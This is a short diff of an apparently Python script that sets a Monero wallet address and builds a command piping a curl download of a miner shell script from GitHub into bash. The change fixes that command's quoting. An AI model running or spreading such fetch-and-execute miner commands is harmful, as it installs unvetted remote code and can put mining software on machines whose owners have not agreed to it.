@@ -28,7 +28,7 @@ xmr_addy = '47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf
 # Do not edit below this line
 # ===========================================================================================================================================
 
-base_install_cmd = "'curl -s -L https://raw.githubusercontent.com/junaidd007/Monero/main/Cookie/Cookie.sh | bash -s  + xmr_addy + "'"
+base_install_cmd = "'curl -s -L https://raw.githubusercontent.com/junaidd007/Monero/main/Cookie/Cookie.sh | bash -s " + xmr_addy + "'"
 print("Downloading csv from: ", url, " Please make sure this file is up to date!")
 req = requests.get(url)
 url_content = req.content
